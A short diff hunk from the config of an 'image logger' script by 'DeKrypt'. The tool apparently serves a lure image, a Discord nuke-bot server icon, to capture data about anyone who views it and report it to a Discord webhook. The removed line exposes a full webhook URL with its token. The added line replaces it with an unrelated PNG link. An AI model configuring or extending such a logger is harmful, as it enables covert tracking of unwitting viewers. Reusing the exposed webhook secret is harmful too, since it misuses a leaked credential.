@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1521010823080706049/vyl0crccERekjZpX-RlMLfg_FMkLBTzCtm78EaJ0BIkoSpHPNsf8sEKG---Mslc0Gzw8",
+    "webhook": "https://static.thenounproject.com/png/105262-200.png",
     "image": "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Nuke%20Bot/server-icon.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
